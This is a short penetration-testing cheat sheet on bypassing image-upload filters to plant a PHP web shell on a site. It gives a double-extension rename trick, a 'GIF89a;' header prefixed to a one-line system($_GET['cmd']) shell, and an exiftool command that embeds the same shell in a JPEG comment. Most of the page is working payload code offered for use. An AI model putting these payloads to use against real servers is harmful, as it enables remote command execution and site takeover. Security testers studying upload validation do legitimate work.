# Bypass image upload

Here is the definite guide:

http://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html

https://www.owasp.org/index.php/Unrestricted_File_Upload

## Rename it

But instead we can just rename our shell and upload it as shell.php.jpg. It passed the filter and the file is executed as php.

## GIF89a;
If they check the content.
Basically you just add the text "GIF89a;" before you shell-code. So it would look something like this:

```
GIF89a;
<?
system($_GET['cmd']);//or you can insert your complete shell code
?>
```

## In image
```
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg
```

Exiftool is a great tool to view and manipulate exif-data.
Then I had to rename the file

mv lo.jpg lo.php.jpg